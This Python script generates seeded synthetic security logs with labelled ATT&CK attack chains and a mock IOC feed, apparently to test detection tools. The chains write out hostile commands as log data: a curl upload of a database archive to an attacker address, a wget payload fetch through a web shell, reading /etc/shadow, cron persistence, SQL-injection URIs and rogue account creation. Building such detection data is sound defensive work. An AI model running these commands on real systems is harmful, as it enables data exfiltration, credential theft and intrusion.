"""Seeded synthetic security-log generator with labelled ATT&CK attack chains.

Writes four JSONL logs (auth, process, conn, web), a ground-truth labels file and a
local IOC feed. Everything is derived from one `random.Random(seed)`, so the same
seed always produces byte-identical output.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path

LOG_TYPES = ("auth", "process", "conn", "web")
BASE_TIME = datetime(2026, 3, 2, tzinfo=UTC)
DAYS = 3

INTERNAL_HOSTS = {
    "web-01": "10.0.1.10",
    "web-02": "10.0.1.11",
    "db-01": "10.0.2.20",
    "fs-01": "10.0.2.21",
    "backup-01": "10.0.2.30",
    "dc-01": "10.0.3.5",
    **{f"ws-{i:02d}": f"10.0.10.{100 + i}" for i in range(1, 13)},
}
SERVERS = ["web-01", "web-02", "db-01", "fs-01", "backup-01", "dc-01"]
WORKSTATIONS = [h for h in INTERNAL_HOSTS if h.startswith("ws-")]
USERS = [
    "alice",
    "bob",
    "carol",
    "dave",
    "erin",
    "frank",
    "grace",
    "heidi",
    "ivan",
    "judy",
    "mallory",
    "niaj",
    "olivia",
    "peggy",
    "rupert",
    "sybil",
    "trent",
    "victor",
    "walter",
    "zoe",
]
ADMINS = ["svc_backup", "opsadmin"]
BENIGN_CMDS = [
    ("/usr/bin/ls", "ls -la"),
    ("/usr/bin/grep", "grep -r TODO src"),
    ("/usr/bin/python3", "python3 report.py"),
    ("/usr/bin/git", "git pull"),
    ("/usr/bin/vim", "vim notes.txt"),
    ("/usr/bin/top", "top -b -n1"),
    ("/usr/bin/df", "df -h"),
    ("/usr/bin/ps", "ps aux"),
    ("/usr/bin/tar", "tar czf logs.tgz /var/log/app"),
    ("/usr/bin/curl", "curl -s https://repo.internal/health"),
    ("/usr/bin/ssh", "ssh fs-01"),
]
WEB_PATHS = ["/", "/login", "/products", "/products/42", "/cart", "/api/v1/items", "/static/app.js", "/search?q=shoes"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2)", "curl/8.5.0"]
# RFC 5737 documentation ranges: never routable, safe for synthetic "external" addresses.
EXTERNAL_NETS = ["192.0.2.", "198.51.100.", "203.0.113."]


@dataclass
class Gen:
    rng: random.Random
    events: dict[str, list[dict]] = field(default_factory=lambda: {t: [] for t in LOG_TYPES})
    pid: int = 1000

    def ts(self, t: datetime) -> str:
        return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

    def rand_time(self) -> datetime:
        return BASE_TIME + timedelta(seconds=self.rng.uniform(0, DAYS * 86400))

    def ext_ip(self) -> str:
        return self.rng.choice(EXTERNAL_NETS) + str(self.rng.randint(2, 254))

    def next_pid(self) -> int:
        self.pid += self.rng.randint(1, 40)
        return self.pid

    def add(self, log_type: str, t: datetime, label: tuple[str, str, str] | None = None, **fields) -> None:
        ev = {"ts": self.ts(t), "log_type": log_type, **fields}
        if label:
            ev["_label"] = label
        self.events[log_type].append(ev)

    # --- primitive event builders -------------------------------------------------
    def auth(self, t, host, user, src_ip, outcome, method="password", label=None):
        verb = "Accepted" if outcome == "success" else "Failed"
        msg = f"{verb} {method} for {user} from {src_ip} port {self.rng.randint(30000, 65000)} ssh2"
        self.add("auth", t, label, host=host, service="sshd", user=user, src_ip=src_ip, outcome=outcome, message=msg)

    def proc(self, t, host, user, image, cmdline, parent="/bin/bash", label=None):
        self.add(
            "process",
            t,
            label,
            host=host,
            user=user,
            pid=self.next_pid(),
            parent_image=parent,
            image=image,
            cmdline=cmdline,
        )

    def conn(self, t, host, src, dst, port, service, orig_bytes, resp_bytes, duration, label=None):
        uid = "C" + "".join(self.rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=15))
        self.add(
            "conn",
            t,
            label,
            host=host,
            uid=uid,
            src_ip=src,
            dst_ip=dst,
            dst_port=port,
            proto="tcp",
            service=service,
            duration=round(duration, 3),
            orig_bytes=orig_bytes,
            resp_bytes=resp_bytes,
            conn_state="SF",
        )

    def web(self, t, host, src_ip, method, uri, status, ua, label=None):
        self.add(
            "web",
            t,
            label,
            host=host,
            src_ip=src_ip,
            method=method,
            uri=uri,
            status=status,
            user_agent=ua,
            bytes=self.rng.randint(200, 40000),
        )


def benign(g: Gen, scale: float) -> None:
    rng = g.rng
    n = lambda base: int(base * scale)  # noqa: E731
    for _ in range(n(2500)):
        host = rng.choice(SERVERS + WORKSTATIONS)
        user = rng.choice(USERS + ADMINS)
        src = INTERNAL_HOSTS[rng.choice(WORKSTATIONS)]
        t = g.rand_time()
        if rng.random() < 0.03:  # typos: a few benign failures before a success
            g.auth(t, host, user, src, "failure")
            t += timedelta(seconds=rng.uniform(2, 20))
        g.auth(t, host, user, src, "success", method=rng.choice(["password", "publickey"]))
    for _ in range(n(9000)):
        host = rng.choice(SERVERS + WORKSTATIONS)
        image, cmd = rng.choice(BENIGN_CMDS)
        g.proc(g.rand_time(), host, rng.choice(USERS), image, cmd)
    for _ in range(n(9000)):
        host = rng.choice(WORKSTATIONS + SERVERS)
        dst_host = rng.choice(SERVERS)
        port, svc = rng.choice([(443, "ssl"), (22, "ssh"), (53, "dns"), (5432, "postgres"), (445, "smb")])
        g.conn(
            g.rand_time(),
            host,
            INTERNAL_HOSTS[host],
            INTERNAL_HOSTS[dst_host],
            port,
            svc,
            rng.randint(200, 80000),
            rng.randint(200, 500000),
            rng.uniform(0.01, 30),
        )
    for _ in range(n(800)):  # outbound browsing
        host = rng.choice(WORKSTATIONS)
        g.conn(
            g.rand_time(),
            host,
            INTERNAL_HOSTS[host],
            g.ext_ip(),
            443,
            "ssl",
            rng.randint(500, 60000),
            rng.randint(1000, 3_000_000),
            rng.uniform(0.1, 60),
        )
    for day in range(DAYS):  # nightly backups: large but internal transfers (false-positive bait)
        t = BASE_TIME + timedelta(days=day, hours=2, minutes=rng.randint(0, 20))
        g.proc(
            t,
            "db-01",
            "svc_backup",
            "/usr/bin/pg_dump",
            "pg_dump -Fc shop > /backup/shop.dump",
            parent="/usr/sbin/cron",
        )
        g.conn(
            t + timedelta(minutes=3),
            "db-01",
            INTERNAL_HOSTS["db-01"],
            INTERNAL_HOSTS["backup-01"],
            22,
            "ssh",
            rng.randint(150_000_000, 300_000_000),
            40_000,
            rng.uniform(60, 300),
        )
    for _ in range(n(5000)):
        host = rng.choice(["web-01", "web-02"])
        g.web(
            g.rand_time(),
            host,
            g.ext_ip(),
            rng.choice(["GET", "GET", "GET", "POST"]),
            rng.choice(WEB_PATHS),
            rng.choice([200, 200, 200, 200, 304, 404]),
            rng.choice(UAS),
        )


def chain_bruteforce_exfil(g: Gen) -> None:
    """C1: SSH brute force -> valid account -> lateral SSH -> exfiltration."""
    rng, cid = g.rng, "C1"
    attacker, user = "203.0.113.66", "bob"
    t = BASE_TIME + timedelta(days=1, hours=3, minutes=rng.randint(0, 30))
    for _ in range(80):
        g.auth(
            t,
            "web-01",
            rng.choice(["root", "admin", "bob", "test", "oracle"]),
            attacker,
            "failure",
            label=(cid, "T1110.001", "credential-access"),
        )
        t += timedelta(seconds=rng.uniform(0.5, 3))
    g.auth(t, "web-01", user, attacker, "success", label=(cid, "T1078", "initial-access"))
    t += timedelta(minutes=4)
    g.proc(t, "web-01", user, "/usr/bin/ssh", "ssh bob@db-01", label=(cid, "T1021.004", "lateral-movement"))
    g.conn(
        t,
        "web-01",
        INTERNAL_HOSTS["web-01"],
        INTERNAL_HOSTS["db-01"],
        22,
        "ssh",
        5200,
        8100,
        900.0,
        label=(cid, "T1021.004", "lateral-movement"),
    )
    g.auth(
        t + timedelta(seconds=1),
        "db-01",
        user,
        INTERNAL_HOSTS["web-01"],
        "success",
        label=(cid, "T1021.004", "lateral-movement"),
    )
    t += timedelta(minutes=6)
    g.proc(
        t,
        "db-01",
        user,
        "/usr/bin/tar",
        "tar czf /tmp/.c.tgz /var/lib/postgresql",
        label=(cid, "T1560.001", "collection"),
    )
    t += timedelta(minutes=2)
    g.proc(
        t,
        "db-01",
        user,
        "/usr/bin/curl",
        f"curl -T /tmp/.c.tgz http://{attacker}:8080/u",
        label=(cid, "T1048", "exfiltration"),
    )
    g.conn(
        t,
        "db-01",
        INTERNAL_HOSTS["db-01"],
        attacker,
        8080,
        "http",
        412_000_000,
        900,
        240.0,
        label=(cid, "T1048", "exfiltration"),
    )


def chain_webshell(g: Gen) -> None:
    """C2: exploit public web app -> web shell -> command execution -> tool transfer."""
    rng, cid = g.rng, "C2"
    attacker = "198.51.100.23"
    t = BASE_TIME + timedelta(days=0, hours=14, minutes=rng.randint(0, 30))
    for uri in [
        "/search?q=1%27%20OR%201=1--",
        "/products/42%27%20UNION%20SELECT%20null--",
        "/upload.php?file=../../etc/passwd",
        "/upload.php",
    ]:
        g.web(
            t,
            "web-02",
            attacker,
            "POST" if uri == "/upload.php" else "GET",
            uri,
            200 if uri == "/upload.php" else 500,
            "sqlmap/1.8",
            label=(cid, "T1190", "initial-access"),
        )
        t += timedelta(seconds=rng.uniform(5, 30))
    for cmd in ["id", "uname -a", "cat /etc/passwd", "wget http://198.51.100.23/x.sh -O /tmp/x.sh"]:
        g.web(
            t,
            "web-02",
            attacker,
            "GET",
            f"/uploads/shell.php?c={cmd.replace(' ', '+')}",
            200,
            "Mozilla/5.0",
            label=(cid, "T1505.003", "persistence"),
        )
        tech = ("T1105", "command-and-control") if cmd.startswith("wget") else ("T1059.004", "execution")
        g.proc(t, "web-02", "www-data", "/bin/sh", f"sh -c {cmd}", parent="/usr/sbin/php-fpm", label=(cid, *tech))
        if cmd.startswith("wget"):
            g.conn(
                t,
                "web-02",
                INTERNAL_HOSTS["web-02"],
                attacker,
                80,
                "http",
                300,
                48_000,
                1.2,
                label=(cid, "T1105", "command-and-control"),
            )
        t += timedelta(seconds=rng.uniform(20, 90))


def chain_cred_dump_c2(g: Gen) -> None:
    """C3: shadow-file dumping -> cron persistence -> periodic HTTPS beaconing."""
    rng, cid = g.rng, "C3"
    host, user, c2 = "ws-07", "erin", "192.0.2.77"
    t = BASE_TIME + timedelta(days=1, hours=22, minutes=rng.randint(0, 30))
    g.proc(t, host, "root", "/usr/bin/sudo", "sudo cat /etc/shadow", label=(cid, "T1003.008", "credential-access"))
    g.proc(
        t + timedelta(seconds=1),
        host,
        "root",
        "/usr/bin/cat",
        "cat /etc/shadow",
        parent="/usr/bin/sudo",
        label=(cid, "T1003.008", "credential-access"),
    )
    t += timedelta(minutes=3)
    g.proc(
        t,
        host,
        user,
        "/usr/bin/crontab",
        "crontab -l | { cat; echo '*/30 * * * * /tmp/.u/upd'; } | crontab -",
        label=(cid, "T1053.003", "persistence"),
    )
    t += timedelta(minutes=10)
    while t < BASE_TIME + timedelta(days=DAYS):
        g.proc(
            t,
            host,
            user,
            "/tmp/.u/upd",
            "/tmp/.u/upd",
            parent="/usr/sbin/cron",
            label=(cid, "T1071.001", "command-and-control"),
        )
        g.conn(
            t,
            host,
            INTERNAL_HOSTS[host],
            c2,
            443,
            "ssl",
            rng.randint(400, 700),
            rng.randint(300, 900),
            0.4,
            label=(cid, "T1071.001", "command-and-control"),
        )
        t += timedelta(minutes=30, seconds=rng.uniform(-20, 20))


def chain_spray_account(g: Gen) -> None:
    """C4: password spraying -> valid account -> local account creation."""
    rng, cid = g.rng, "C4"
    attacker, victim = "203.0.113.140", "judy"
    t = BASE_TIME + timedelta(days=2, hours=9, minutes=rng.randint(0, 30))
    for u in rng.sample(USERS, len(USERS)):
        g.auth(t, "fs-01", u, attacker, "failure", label=(cid, "T1110.003", "credential-access"))
        t += timedelta(seconds=rng.uniform(20, 60))
    g.auth(t, "fs-01", victim, attacker, "success", label=(cid, "T1078", "initial-access"))
    t += timedelta(minutes=5)
    g.proc(
        t,
        "fs-01",
        victim,
        "/usr/bin/sudo",
        "sudo useradd -m -s /bin/bash sysupdate",
        label=(cid, "T1136.001", "persistence"),
    )
    g.proc(
        t + timedelta(seconds=1),
        "fs-01",
        "root",
        "/usr/sbin/useradd",
        "useradd -m -s /bin/bash sysupdate",
        parent="/usr/bin/sudo",
        label=(cid, "T1136.001", "persistence"),
    )


CHAINS = {
    "C1": ("SSH brute force to data exfiltration", chain_bruteforce_exfil),
    "C2": ("Web exploit and web shell", chain_webshell),
    "C3": ("Credential dumping, cron persistence and C2 beacon", chain_cred_dump_c2),
    "C4": ("Password spray and rogue local account", chain_spray_account),
}

# IOC feed: some (not all) attacker infrastructure plus decoys that never appear in logs.
IOCS = [
    {"indicator": "203.0.113.66", "type": "ip", "threat": "ssh-bruteforce botnet", "confidence": 80},
    {"indicator": "198.51.100.23", "type": "ip", "threat": "sqlmap scanner / web shell operator", "confidence": 70},
    {"indicator": "192.0.2.77", "type": "ip", "threat": "commodity C2 over HTTPS", "confidence": 60},
    {"indicator": "/uploads/shell.php", "type": "uri", "threat": "known PHP web shell path", "confidence": 50},
    {"indicator": "/tmp/.u/upd", "type": "file", "threat": "linux implant dropper path", "confidence": 55},
    {"indicator": "203.0.113.250", "type": "ip", "threat": "tor exit node", "confidence": 40},
    {"indicator": "198.51.100.199", "type": "ip", "threat": "phishing kit host", "confidence": 65},
]


def generate(seed: int, out_dir: Path, scale: float = 1.0) -> dict[str, str]:
    """Generate the dataset into `out_dir`. Returns {filename: sha256}."""
    g = Gen(random.Random(seed))
    benign(g, scale)
    for _, fn in CHAINS.values():
        fn(g)

    out_dir.mkdir(parents=True, exist_ok=True)
    labels: dict[str, dict] = {cid: {"chain_id": cid, "name": name, "steps": {}} for cid, (name, _) in CHAINS.items()}
    for log_type in LOG_TYPES:
        evs = sorted(g.events[log_type], key=lambda e: e["ts"])  # stable: ties keep insertion order
        with open(out_dir / f"{log_type}.jsonl", "w", encoding="utf-8", newline="\n") as f:
            for i, ev in enumerate(evs):
                ev = {"event_id": f"{log_type}-{i:06d}", **ev}
                label = ev.pop("_label", None)
                if label:
                    cid, tech, tactic = label
                    step = labels[cid]["steps"].setdefault(tech, {"technique": tech, "tactic": tactic, "event_ids": []})
                    step["event_ids"].append(ev["event_id"])
                f.write(json.dumps(ev, separators=(",", ":")) + "\n")
    label_doc = {"seed": seed, "chains": [{**c, "steps": list(c["steps"].values())} for c in labels.values()]}
    (out_dir / "labels.json").write_text(json.dumps(label_doc, indent=2) + "\n", encoding="utf-8")
    (out_dir / "iocs.json").write_text(json.dumps(IOCS, indent=2) + "\n", encoding="utf-8")
    return dataset_hashes(out_dir)


def dataset_hashes(out_dir: Path) -> dict[str, str]:
    names = [f"{t}.jsonl" for t in LOG_TYPES] + ["labels.json", "iocs.json"]
    return {n: hashlib.sha256((out_dir / n).read_bytes()).hexdigest() for n in names}


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--seed", type=int, default=7)
    ap.add_argument("--out", type=Path, default=Path("data"))
    ap.add_argument("--scale", type=float, default=1.0, help="multiplier for benign volume")
    args = ap.parse_args()
    hashes = generate(args.seed, args.out, args.scale)
    total = sum((args.out / n).stat().st_size for n in hashes)
    print(f"wrote {len(hashes)} files to {args.out} ({total / 1e6:.2f} MB)")


if __name__ == "__main__":
    main()
